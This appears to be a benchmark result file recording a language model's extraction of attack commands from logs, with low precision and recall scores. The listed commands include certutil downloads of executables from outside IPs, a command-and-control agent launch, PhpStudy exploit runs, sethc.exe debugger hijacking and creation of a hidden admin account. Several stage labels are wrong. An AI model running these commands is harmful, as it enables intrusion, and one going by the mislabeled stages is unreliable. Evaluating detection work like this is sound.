@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ '\"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ '\"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "winbrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\cmd.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "Python script execution",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d '\"D:/phpStudy/WWW\"'&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /c \"cd /d '\\\"D:/phpStudy/WWW\\/\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\\\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attacker initiated an initial access through multiple vectors, using both Google Chrome as an initial vector and the CertUtil tool. The attacker then used various tools like Python scripts and PowerShell to escalate privileges, engage in discovery activities, establish persistence through image hijacking, collect data, access credentials, and employ command-and-control operations throughout the attack.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37069,
+      "completion_tokens": 3754,
+      "total_tokens": 40823,
+      "wall_clock_s": 46.807,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3125,
+      "recall": 0.625,
+      "f1": 0.4166666666666667,
+      "tp": 5,
+      "fp": 11,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.125,
+      "recall": 0.3333333333333333,
+      "f1": 0.18181818181818182,
+      "tp": 2,
+      "fp": 14,
+      "fn": 4,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.0625,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37069,
+      "completion_tokens": 3754,
+      "total_tokens": 40823,
+      "wall_clock_s": 46.807,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
